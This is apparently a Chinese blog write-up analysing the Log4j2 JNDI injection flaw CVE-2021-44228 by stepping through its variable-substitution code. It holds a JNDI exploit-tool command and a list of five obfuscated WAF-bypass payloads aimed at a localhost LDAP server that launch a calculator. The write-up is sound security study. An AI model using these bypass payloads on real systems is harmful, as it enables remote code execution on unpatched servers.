# Log4j2

## 简介

Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。

## CVE-2021-44228

`影响版本`：Apache Log4j 2.x <= 2.15.0-rc1

## 分析

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc.exe -a 127.0.0.1`

Log4j2 使用 `org.apache.logging.log4j.core.pattern.MessagePatternConverter#format` 来对日志消息进行处理。这也是触发漏洞的"起始点（应该可以这么说吧）"。
![image-20220905220313157](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052203257.png)

跟进replace
![image-20220905220408090](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052204156.png)

跟进substitute。
这里设置了一些定值。例如：`${`、`}`、`&`、`:-`
![image-20220905220818893](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052208934.png)

![image-20220905221055216](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052210253.png)

再获取到${}中间的值后，还会继续进行substitute判断取${}。（这里可以通过构造绕过waf!!）
接着会来到这里。
![image-20220905221558859](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052215904.png)

随后也就来到了触发点！![image-20220905221643333](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052216403.png)

## 恶意构造绕过WAF

一些常见的绕过payload（网上搜集的）

```
${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
```

可用第一种尝试一下。
在上面所说判断`}`之前还会进行${进行判断，如果判断到了会重新判断`}`
![image-20220905222158414](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052221499.png)

最终获取到如下字符串，并且继续进行substitute
![image-20220905222822602](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052228658.png)

然后处理步骤相似，最后得到字符串。![image-20220905222959523](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052229567.png)

继续跟进substitute
来到这里。判断是否含有`:\-`
![image-20220905223226847](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052232891.png)

然后进入。
判断是否含有`:-`
![image-20220905223643081](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052236115.png)

当判断到就break跳出循环。![image-20220905223936645](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052239700.png)

此时priorVariables这个list集合含有2个参数。![image-20220905224047188](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052240210.png)

接下来来到触发点，此时的varname为a，肯定不能完成触发。s
![image-20220905224126250](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052241281.png)

继续向下执行但是发现replace，跟进看看。

![image-20220905225932052](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052259073.png)

发现会进行替换。变成这种正常样貌。![image-20220905230304228](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209052303302.png)

后续不在重复了。

## Log4j rc1 Bypasss

听说再mac上才能弹出计算器。（自己看大师傅的博客，发现这个洞很鸡肋，并且找不到对应的pom.xml）先放过了。
